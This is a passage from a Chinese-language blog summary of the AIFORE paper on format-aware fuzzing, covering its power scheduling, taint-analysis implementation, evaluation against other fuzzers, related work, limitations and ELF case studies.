3所示的能量调度算法，其基于AFL，以解决上述两个问题。首先，AFLFORE会尝试分析初始种子以构建其格式模型（第3行到第5行）。然后，fuzzer会以格式知识为指导对种子进行变异(第7行)。如果新变异的种子是有价值的，那么我们会重新分析其格式（第19到21行）。当模糊测试陷入困境（即，模糊测试器在给定时间内无法获得新的覆盖率）时，会将fuzzing power分配给那些尚未完全变异的格式（第8到12行）。</p><img src="/2024/08/02/AIFORE：论文阅读/image-20240725173153183.png"  alt="image-20240725173153183" style="zoom:50%;" /><p><strong>Power scheduling for format analysis</strong></p><p>fuzzer在fuzzing过程中会生成大量种子，识别每个种子的字段边界和类型，不必要也不切实际，因为并非所有种子都有价值，分析所有种子会消耗过多的功率。仅对初始种子和我们认为有价值的种子提取格式信息（字段边界和字段类型）。在设计中，“有价值”的种子是指能够到达更多新的基本块，并且可能属于未见过的格式变体（例如，Figure 1中的新型ELF架构）的输入。如果一个种子被认为“有价值”，我们将在Algorithm 3中通过EXTRACTFORMAT函数提取其字段边界和类型。</p><p><strong>Power scheduling for mutation</strong></p><p>在模糊测试过程中，并非所有格式都会以相同的频率进行变异。模糊测试器使用<code>MUTATEWITHFORMAT</code>函数逐个对种子进行变异。具体而言，它会将每个字段的字节作为一个整体进行变异，并根据字段类型选择合适的变异器。例如，对于Size类型的字段，变异器会尝试具有特殊意义的Size值，而不是简单的位翻转；而对于字符串类型的字段，变异器会尝试插入或删除字节。此外，对于那些没有格式信息的字节，fuzzer会使用默认的变异方法，例如AFL中的方法。</p><p>在变异过程中，每当出现一个有价值的种子时，fuzzer会根据重新分析的格式开始对种子进行变异。然而，如果两个“有价值”的种子紧密相邻出现，那么之前的种子可能会变异不足。为了平衡不同格式变体之间的模糊测试能力，我们设计了一种能量重新分配机制。当fuzzer停滞时，我们将fuzzing power重新分配给那些变异程度较低的格式变体绑定的种子，并跳过那些与已完全变异的格式变体绑定的种子。</p><p><strong>实现</strong></p><p>AIFORE基于Vuzzer和libdft使用C++构建了污点分析引擎，以64位程序和字节级污点分析。重新编写了每种指令的污点传播组件，大约有5000行代码用于检查操作数是否被输入字节污染，并获取指令映射和由它们处理的输入字节。我们开发了两个格式分析模块，包含7000行Python代码。使用Angr[27]作为后端来支持静态分析。为了训练模型，使用Keras 2.2.4实现了机器学习组件。为了收集真值数据，编写了一个自动化脚本，借助Autolt[28]从010 Editor 导出模板结果。将提取的格式信息转换为一个Peach pit 文件。</p><blockquote><p>Angr 是一款开源的Python框架，是一个多架构开源二进制分析工具包，能够对二进制文件执行动态符号执行（如Mayhem、KLEE等）和各种静态分析。 直接<code>pip install angr</code>就可以安装。</p><p>Autolt 是一款类似BASIC脚本语言，且完全免费用于自动化Windows操作系统的脚本语言和工具集。它利用模拟键盘，鼠标移动和窗口&#x2F;控件的组合来实现各类自动化任务，包括自动化软件安装、登录、数据自动录入、界面自动化测试、数据抓取等。</p></blockquote><p><strong>评估</strong></p><p>我们对AIFORE进行评估以回答以下四个研究问题：</p><ul><li>RQ1:AIFORE的每个格式提取模块性能如何？</li><li>RQ2:与其他最先进的格式逆向工程工作相比，AIFORE的格式分析性能如何？</li><li>RQ3:与其他最先进的模糊测试器相比，AIFORE在代码覆盖率和漏洞检测方面的性能如何？</li><li>RQ4:AIFORE的每个模块对模糊测试效率的贡献如何？</li></ul><p>在配备24核CPU和128GB内存的机器上运行所有实验。使用Tesla P100 GPU训练模型。模型训练完成后，AIFORE仅在预测字段类型时使用GPU，而且使用频率较低。</p><p><strong>RQ1：AIFORE的格式提取表现</strong></p><p>近年来，平均有7个真实世界的程序被32篇不同的论文评估过。在本论文中，我们收集了17个程序来评估AIFORE，以及15种格式，其中13种是文件输入（包括图像、可执行文件、压缩文件和复合文件），2种是网络协议（附录A）。Table 2展示了我们用来评估AIFORE每个模块的所有格式和程序（以及参数）。</p><img src="/2024/08/02/AIFORE：论文阅读/image-20240727100539531.png"  alt="image-20240727100539531" style="zoom: 67%;" /><p>根据以下因素选择目标输入和程序。首先，这些格式多样且广泛使用。其次，当给定一种类型的输入时，程序可以解析尽可能多的字段，因为AIFORE基于动态污点追踪来分析输入格式，无法识别未被处理的输入字段。我们尽可能将这些程序编译成不同的优化级别（从-O0到-Os）以评估AIFORE的鲁棒性。</p><p><strong>真实数据</strong></p><p>首先，给定一个测试输入，我们使用010 Editor 的公共格式模板解析文件并导出所有包含边界和类型信息的字段记录。这些模板由专家编写，并经过社区验证。</p><p>然后，我们手动预处理记录，以获取字段边界的真值数据，具体分为两个步骤：（1）从针织数据中删除冗余定义。例如，Table 3 显示了ELF格式的签名字段。应删除file_identification[0]到[3]的字段记录，因为file_identification[4]作为一个整体字段存在。（2）删除目标程序未解析的字段记录。例如，readelf不会处理Figure 1种ELF格式的ei_pad字段。我们跳过这些字段，因为所有基于程序行为反向推断输入格式的方法都无法识别它们。</p><p>最后，我们手动检查记录以更正字段的歧义语义类型。例如，PNG文件模板种的char cname[4]字段指示类型为字符串。但是，它在pngtest程序中用作魔数类型。另一个例子，某些格式可能包含一个版本字段，它可能被误标为字符串或整数。为了解决这个问题，我们手动分析模板中每个字段的语义类型，并删除那些具有歧义语义类型标签的字段，从而提高模型训练的准确性。</p><img src="/2024/08/02/AIFORE%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/image-20240727100614562.png" class="" title="image-20240727100614562"><p><strong>字段边界准确性</strong></p><p>我们将边界信息的真值数据记为BoundaryT。我们从互联网或目标程序的测试套件中选择5个样本。这些样本具有不同的特征，例如不同文件大小、不同的压缩级别或特定格式中的不同枚举。对于每个样本，我们手动构建边界信息的真值数据，如真值数据部分所述。对于每个格式，我们选择一个程序，该程序可以尽可能完整地解析输入文件，如Table 2的“Boundary”列所示。然后我们使用AIFORE推断其字段边界（记为BoundaryA）。</p><p>我们使用准确率作为指标，即AIFORE正确识别的字段数量除以真值数据中字段的总数。</p><p>请注意，BoundaryT可能是粗粒度的，即010 editor的模板可能会遗漏一些细粒度的字段。例如PCAP的模板只描述了从数据链路层到传输层（即TCP&#x2F;UDP）的字段，而没有包含应用层（例如HTTP&#x2F;DNS）的字段信息。然而，目标程序tcpdump会更详细地解析数据包，导致AIFORE生成更</p><p>细粒度的边界信息。在计算准确率时，我们将跳过这些字段。为了确保实验的公平性，在计算其他所有解决方案的准确率时，我们也会移除这些字段。尽管AIFORE在我们手动移除的字段中可能表现更差（或者更好），但我们认为结果只会受到轻微影响，因为在我们分析过程中，这种情况很少见。此外，我们在5.2中的结果表明AIFORE的准确率远高于其他解决方案。</p><p>结果如Table 4所示，得出两个结论。</p><img src="/2024/08/02/AIFORE%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/image-20240727102022827.png" class="" title="image-20240727102022827"><p>首先，准确率与编译器优化级别无关。这是因为MC方法是从语义块的角度考虑的，而语义块很少受到编译器优化的影响。对于7z和zip的目标，输入中的字段总数较小，因此即使一个错误的字段也可能导致准确率出现较大波动（约10%）。</p><p>其次，我们手动调查了那些准确率较低的测试目标，发现原因是程序以其自己的方式解析字段。例如，readelf分别比较了前四个字节（即魔数）在4个基本块中的值，如Figure 5所示。使用MC方法，我们将魔数拆分为四个单字节字段，因为它们在不同的基本块中被解析。但是它们在规范中被定义为一个整体。虽然结果与规范不同，但我们认为这不会影响（甚至有利于）模糊测试效率，因为模糊测试的目的是测试程序的实现，而不是提取与规范相比准确的字段边界。</p><p><strong>字段类型准确率</strong></p><p>基于4个实验评估CNN模型的性能。</p><p><strong>实验一：CNN模型在训练集和验证集上是否表现良好？</strong></p><p>我们从8种格式中收集了10582个字段，并选择对应的程序来解析这些输入以训练模型。训练集在Table 2的”Type”列中标记为⊙。我们使用的训练集和验证集的比例为4：1.然后，我们将六种语义类型标记为标签，并将相应的（向量化的）污点追踪作为输入数据来训练CNN模型。平均而言，为一种格式标记训练数据需要2-3小时的手动工作量。这需要为每种格式完成一次，我们认为这是合理的。</p><p>为了验证模型是否能够在不同的编译器优化下表现良好，我们分别使用从-O0到-Os的训练数据训练模型。为了进一步调查模型是否适用于现实情况（即目标程序的编译器优化选择未知），我们还评估了使用混合优化时的模型准确率。我们花费了12个小时收集训练集中所有样本的污点追踪，模型的训练时间平均为20分钟。模型训练完成后，我们评估其Top-1准确率，即判断最高得分预测结果是否正确。</p><p>Figure 14展示了这些结果。我们得出以下结论：（1）不同编译器优化级别（即-O0到-Os）下的性能表现不同，平均准确率超过85%；（2）即使使用混合编译器优化，准确率结果仍然稳定，这意味着该模型适用于现实情况。</p><p><strong>实验二：我们需要多少数据来训练一个足够可靠的CNN模型？</strong></p><p>为了进一步分析训练CNN模型所需的数据量，我们还计算了在不同数据量下训练的模型所达到的准确率。我们将10582个字段设定为单位（即1.0）尺度，并使用不同的尺度（即0.2到2.0）来相应地训练模型。对于每个组，我们随机选择训练数据并重复实验5次。结果如Figure 6所示。</p><p>从结果中可以得出结论，更大的训练数据量会导致更高的模型准确率。然而，当尺度大于1.0时，增长率很快就会停滞。</p><p><strong>实验三：对于已训练的程序，模型能否预测未知格式的字段类型？</strong></p><p>我们定义一个格式对于某个程序而言是未知的，如果（Program,Format）Pairs 对不在AIFORE的训练集中。在本实验中，我们将AIFROE应用于已经使用特定格式训练过的程序，并验证AIFORE是否能够识别这些程序的未知格式（在Table 2中标记为X*）。具体而言，对于训练集中的程序，我们收集了一些它们支持的新文件格式，并将我们训练的模型应用于预测这些新格式的字段类型。</p><p>Table 5的上半部分显示了评估结果。我们考虑Top-2准确率，因为模型的Top-K建议仍然对模糊测试很有价值。具体而言，Top-K字段类型知识可以帮助模糊测试器缩小变异空间并更快地找到高质量的测试用例。</p><p>我们从该表中得出两个结论：</p><p>（1）AIFROE能够以高准确率预测未知格式的字段类型，平均而言，Top-1 准确率超过80%，Top-2准确率超过90%；（2）模型性能与程序的优化级别无关。虽然编译器优化可能会改变代码的特征，但我们的模型在不同的优化级别上学习了稳定的模式。</p><p><strong>实验四：对于未训练的程序，模型能否预测它们的（未知）输入格式？</strong></p><p>我们将上述训练好的模型应用于分析未训练的程序（在Table 2中标记为X）并预测它们的输入格式。我们选择了7个未训练的程序（以及附录中所示的2个协议）和相应的格式来测试AIFORE的准确率。这些未训练的程序是根据以下两个标准选择的：</p><p>（1）它们应该能够解析所选格式；（2）它们不与训练集中的程序共享用于处理所选格式的库。</p><p>后一个要求是为了公平比较。请注意，所选格式（例如ELF）可能被训练集中其他已训练的程序（例如readelf）处理。但它们对于未训练的程序（例如elfutils-readelf）来说仍然是未知的。</p><p>Table 5的下半部分显示了评估结果。我们了解到，AIFORE能够以平均81%的Top-1准确率和88%的Top-2准确率预测字段类型。即使我们使用来自不同编译器优化级别的混合测试数据，AIFORE也能够根据程序如何解析字段来预测字段类型。</p><p><strong>RQ2：格式提取比较</strong></p><p>我们将AIFORE与使用混合优化（即-O0 到 -Os）的程序训练的CNN模型进行比较，并与现有的输入格式逆向工程方法进行比较，例如Polyglot[3]、Protocol Informatics(PI)项目[30]、ProFuzzer[8]、AFL-Analyze[14]和TIFF-fuzzer[6]，以衡量格式逆向性能。</p><p>我们收集了AIFORE的字段边界和类型结果，并将结果与ProFuzzer、AFL-Analyze和TIFF-fuzzer进行比较。还有一些其他共军，例如WEIZZ[9]，可以提取输入格式。但是我们没有将AIFORE的字段边界准确率与它们进行比较，因为即使目标程序已经解析了字段，它们也无法提取所有字段边界。我们在附录B中分析了具体的案例，以解释这种假阴性的原因。</p><p><strong>评估指标</strong>，对于字段边界分析，我们计算不同解决方案的准确率，即正确识别的字段数量除以真值数据中字段的总数。</p><p>对于字段类型分析，我们仔细处理结果，因为不同的解决方案侧重于不同的字段类型。例如，ProFuzzer将字段类型分为6类，而AFL-Analyze仅识别3中语义类型。我们手动检查不同解决方案产生的结果，并相应地计算准确率。对于AFL-Analyze，我们只检查其结果是否与它们定义的3中语义类型匹配（即原始数据、魔数和长度）。对于ProFuzzer，我们也类似的方式检查其结果。对于AIFORE，我们手动检查Top-1结果是否与我们在 §3.2.1中定义的6种语义类型匹配。此外，我们还衡量了每个解决方案分析一个输入格式的平均时间成本。</p><p><strong>测试目标</strong>，为了公平起见，我们分别从训练集（Table 4）和未知格式和程序（Table 5）中选择4种格式和程序，这些格式和程序具有不同的准确率水平。我们旨在调查其他解决方案在AIFORE下对不同准确率水平的目标的性能。所选目标如Table 6所示。对于程序，我们使用其默认编译器优化编译所有目标。关于输入样本，我们为已训练的程序选择不在训练集中的样本，并为未训练的程序随机选择一些输入样本。字段类型预测的训练集和验证集的详细信息在5.1.2的第一部分中描述。</p><p><strong>输入大小</strong>，输入大小会影响格式逆向工程的运行时性能。AIFORE、ProFuzzer和AFL-Analyze都依赖于动态分析来预测字段类型，但使用不同的方法。ProFuzzer和AFL-Analyze都对每个输入字节进行编译，并重新运行程序以获得覆盖位图作为当前执行的概要文件。根据该概要文件的变化，它们可以分析每个字节的类型特征，并将具有类似特征的连续字节组合成具有对应类型的字段。因此，较大的文件可能需要更多时间才能获得结果。AIFORE基于污点追踪和CNN模型来推断字段边界和字段类型。虽然模型只训练一次，但污点分析需要耗时的分析。为了更好地理解输入大小如何影响每项工作的性能，我们将输入文件根据其大小划分为不同的组，并观察每个组完成分析所需的时间。</p><p><strong>结果</strong>，Table 6展示了字段边界和类型分析的准确率，Table 7展示了解析一个输入的平均时间成本。</p><p>从Table 6中，我们可以了解到AIFORE在字段边界识别和字段类型预测方面都取得了更高的准确率。此外，AIFORE在已训练的程序中表现优于未训练的程序。这与我们的经验一致，因为该模型已经学习了这些程序如何准确地解析不同字段类型的模式。</p><p>使用AIFORE（和TIFF-fuzzer）解析文件的平均时间在不同的尺寸类别中没有显著差异，而 ProFuzzer 和 AFL-Analyze 在解析较大的文件时花费了更多的时间。在表 7 中，B  代表边界识别，计数包括污点分析所需的时间（这占用了大部分总时间）。T  代表类型预测，其时间成本在测试过程中保持稳定，因为我们有一个具有稳定预测时间的训练模型。我们发现，在 Profuzzer 和  AFL-Analyze 中，概要分析阶段消耗了大部分时间，这与输入大小密切相关。然而，AIFORE（和  TIFF-fuzzer）中的污点分析对输入大小并不敏感。由于 AFL-Analyze 和 TIFF-fuzzer  执行了一些粗略的分析，它们具有更好的执行时间，但平均而言，它们的准确率低于 AIFORE。</p><p>此外，我们还在两个协议上进行了逆向工程。详细结果在附录A中给出。与其他工具相比，AIFORE不仅在字段边界和类型方面提供了更准确的格式知识，而且还提供了更多细节。</p><p><strong>RQ3：模糊测试性能比较</strong></p><p>已经有一些模糊测试器尝试提取格式知识并执行能量调度以优化模糊测试过程。我们将AIFORE与它们进行比较，以调查我们的格式分析和能量调度在多大程度上可以提高模糊测试效率。请注意，对于字段类型分类，一旦模型构建完成，我们就不需要再模糊测试过程中重新训练模型。</p><p><strong>目标程序和种子</strong>，对于程序，我们使用15个程序来解析文件，如Table 2所示，其中6个是已训练的，9个是AIFORE没有见过的。对于每种文件类型，我们随机选择一个输入文件作为所有模糊测试器的初始种子。</p><p><strong>模糊测试器</strong>，我们将AIFORE与6个模糊测试器进行比较，包括格式感知模糊测试器、格式不感知但流行的模糊测试器以及能量调度优化模糊测试器，即ALF、AFLFast、ProFuzzer、TIFF-fuzzer、WEIZZ和EcoFuzz。AFL是最流行的灰盒模糊测试工具之一，并且有许多模糊测试器在AFL之上。AFLFast和EcoFuzz通过优先考虑可能导致新覆盖率的种子来优化AFL。ProFuzzer具有一个动态探测阶段来推断字段边界和字段类型，以提高模糊测试效率。TIFF-fuzzer和WEIZZ使用格式信息来提高模糊测试效率。</p><p><strong>代码覆盖率结果</strong></p><p>对于每个目标程序，我们运行所有模糊测试器24小时，重复5次。然后我们测量平均BB覆盖率，而不是路径覆盖率，因为并非所有模糊测试器都使用相同的指标来计算路径。</p><p>从Table 8中的结果，我们可以得出以下结论：</p><ol><li>除了 pngtest 之外，AIFORE 显著提高了大多数目标的覆盖率，WEIZZ 在 pngtest 上表现最佳。原因是 WEIZZ  不仅可以检测到文件中的校验和字段，还可以纠正校验和值。然而，即使 AIFORE  可以识别该字段是校验和字段，它也不支持校验和值的纠正。对于所有目标，AIFORE（B+T+P）（即启用字段边界、类型分析，并利用功率调度算法）与 ProFuzzer 和 WEIZZ 相比，平均分别提高了 6% 和 26%，如图 7 所示。</li><li>即使目标程序和文件格式是未知的，AIFORE 的覆盖率提升也很显著。</li><li>AIFORE 实现了最佳性能。对于  TIFF-fuzzer，由于它的目标是最大限度地提高触发错误的可能性，我们发现它不擅长提高代码覆盖率。虽然 ProFuzzer  在大多数情况下也比格式不感知的模糊测试器（如 AFL 和  AFLFast）表现更好，但它的分析时间与输入大小成正比，这使其不能扩展到大型输入。观察到 ProFuzzer 在 XLS 中表现最差，除了  TIFF-fuzzer。原因是 XLS 种子的最小大小超过 1k 字节，这对 ProFuzzer 来说太大了。</li></ol><p><strong>Related Work</strong></p><ul><li><p>Format-Aware Fuzzing 格式感知模糊测试</p><ul><li>格式感知模糊测试器试图理解输入的格式以提高模糊测试效率。TIFF-fuzzer通过推断输入字段的一些程序变量类型（例如，int、char*）来执行bug引导变异。ProFuzzer使用预定义规则来推断字段和相应的类型。然而，添加更多数据类型是劳动密集型的。此外，这些规则可能不够准确，无法涵盖所有情况。Steelix识别输入中的Magic number以通过值验证。但它不分析其他类型的字段。Intriguer利用轻量级污点分析来查找程序中指令处理的多字节字段，然后使用字段级知识来优化符号执行。从文件格式的角度来看，由于它的跟踪不完整，它只能提取一小部分字段。WEIZZ根据输入字节和比较指令之间的依赖关系将输入拆分为字段，这忽略了不影响程序控制流的字节。</li><li>AIFORE提取了更准确、具体和完整的字段边界和语义类型的格式知识，这提高了模糊测试效率。此外，AIFORE利用一种新颖的能量调度算法来平衡不同格式的power。</li></ul></li><li><p>Input Format Reverse Engineering 输入格式逆向工程</p><ul><li>输入格式逆向工程工作可以根据它们解决的问题分为两大类<ul><li><strong>字段边界识别</strong>，识别输入中不同字段的边界是逆向格式的基础。一些工作尝试基于污点分析或少量网络消息的跟踪分析将输入拆分为字段。与AIFORE最接近的工作是Tupni，它使用指令中的加权污点信息，以及贪婪算法来识别不同的字段。然而，指令级污点信息可能会产生误报，因为它没有考虑语义。此外，Tupni是一种粗粒度的方法，它识别的记录可能包含多个字段，而不是单个字段。AIFORE将BB视为最小功能单元，而不是指令。AutoFormat将动态污点分析和调用栈结合起来构建字段树。它更多地依赖于令牌化和树本身的操作，而不是程序如何处理不同的字段。MIMID和AUTOGRAM也依赖于动态污点分析和调用栈分析。它们用于提取基于文本输入的上下文无关语法，而不是基于二进制的上下文敏感输入，后者更加复杂。Reverx通过预定义的分隔符将输入拆分成字段，它不能用于二进制消息。还有一些其他工作试图通过分析大量高质量输入来识别字段。然而，AIFORE只需要一个输入就可以提取字段知识。</li><li><strong>字段类型识别</strong>，识别不同字段的类型也是一个重要的问题。当前的工作主要利用动态程序分析和预定义规则将输入字段分类为不同的类型。Dispatcher利用污点分析和启发式规则来识别字段类型，类似于TIFF-fuzzer。Polyglot尝试识别协议消息中的关键字和分隔符。它还尝试通过启发式规则识别长度字段。然而，识别的字段类型是有限的，当消息不严格时，启发式规则也有局限性。</li></ul></li></ul></li><li><p>Binary Analysis with AI 利用AI进行二进制分析</p><ul><li>与基于AI的二进制分析最接近的工作包括二进制相似性检测和语义信息恢复。</li></ul></li><li><p><strong>Limitation</strong></p><ul><li>虽然AIFORE在字段边界检测和类型分析方面具有良好的准确性，但仍存在一些局限性。正如描述的那样，我们的方法从根本上依赖于动态污点分析。因此，AIFORE的主要限制是程序如何解析输入会极大地影响结果。例如，如果一个程序没有解析某些字段，AIFORE就无法提取格式知识。此外，如果一个程序分别解析一个字段的单个字节，AIFORE可能会产生误报。然而，我们可以通过将输入提供给多个可以解析此格式的程序来克服这个问题。</li><li>第二个限制是我们的分析以字节粒度运行，这意味着无法分析位级字段。支持位级分析在技术上是可行的，但需要进一步的工程和优化。字节级分析也表明AIFORE不支持基于文本的输入。基于文本的输入的最小单位是关键字，而不是字节。第三，AIFORE难以分析输入加密或代码混淆的情况（例如，在恶意软件或勒索软件中）。加密输入中没有明显的格式信息，开发人员也可能使用混淆代码来隐藏解析文件的操作模式。有一些正交工作，例如Reformat，尝试逆向加密输入的格式。</li></ul></li></ul><p><strong>Case Study</strong></p><p>在本节中，我们将一些具体的例子，以帮助理解AIFORE如何从字段边界识别和字段类型分类的角度超越其他最先进的工作。我们以ELF为例进行说明。</p><ul><li><p><strong>Field Boundary Case</strong></p><ul><li>以两个能够识别输入中字段的格式感知模糊测试工具为例。模糊测试期间的字段提取结果如Figure 10所示。</li></ul><img src="/2024/08/02/AIFORE：论文阅读/image-20240728142518357.png"  alt="image-20240728142518357" style="zoom:50%;" /><ul><li>从结果可以看出，TIFF-fuzzer和AIFORE将前四个字节（即magic_number字段）拆分为单个字节字段。然而，由于程序逐个解析字节，因此最好对每个字节进行模糊测试，而不是作为一个整体进行模糊测试。对于WEIZZ，存在一些假阴性。原因是WEIZZ在提取字段时依赖cmp指令，这并不充分。在AIFORE中，我们对有价值的输入执行完整的污点分析，而不是像WEIZZ那样，这是的AIFORE在字段时别方面获得了更高的准确性，因此可以比其他模糊测试器更好地提高模糊测试效率。</li></ul></li><li><p><strong>Field Type Case</strong></p><ul><li>对于字段类型识别，最先进的技术通常依赖于特定规则，并且它们识别的字段类型通常是程序类型，而不是字段的语义类型。例如，TIFF-fuzzer基于库中的API(strcmp、strcpy)推断字段类型，然后将字段拆分为几个程序变量类型，例如char* 和int。然而，这些规则和类型可能不足。以ELF文件中的section名称s_name为例。这些字段是字符串类型。但是，TIFF-fuzzer将它们视为连续的int字节。原因是readelf使用repe cmpsb指令而不是strcmp调用来解析s_name。在AIFORE中，它将此字段标记为魔数，这也是合理的，因为程序试图将section名称和硬编码字符串进行比较。然后，我们调查AIFORE中的模型为何将该字段预测为魔数。我们利用Grad-cam，它用于解释模型为何做出特定决策。它帮助人类了解分类模型的内部工作原理。</li><li>为了解释模型的决策，我们将魔数字段的向量化语义特征（IR操作、库调用和格式字符串）输入Grad-cam。然后，我们观察哪个特征在决策中起着最重要的作用。我们选择Grad-cam的前5个特征进行观察[‘CmpLT32U’, ’128to64’, ‘CmpLE64S’, ‘And8’, ‘CmpLE32U’]。结果表明，当模型将字段预测为magic number时，cmp 特征起着最重要的作用，这是合理的。</li><li>另一个能够识别字段语义类型的工作是ProFuzzer。我们以Figure 10中偏移量为0x10的字段e_type为例。它代表文件类型（例如，ET_EXEC），这是一个枚举类型。在探测阶段，ProFuzzer将其视为错误的偏移量类型。然后，我们调查原因，发现这是由于代码覆盖位图的限制。ProFuzzer对e_type中的每个字节进行变异，以观察位图的相似性。但从Figure 11中我们了解到，不同的switch case共享相同的位图，这导致ProFuzzer做出了错误的决策。然而，在AIFORE中，它根据程序如何解析特定字段来预测字段类型。并且我们还使用前向切片来合并 BB 以获得更多代码特征，这使得它能够正确识别此字段。</li></ul><img src="/2024/08/02/AIFORE：论文阅读/image-20240728144306607.png"  alt="image-20240728144306607" style="zoom: 50%;" /></li></ul>]]></content>
    
    
    <categories>
      
      <category>Paper</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Paper</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
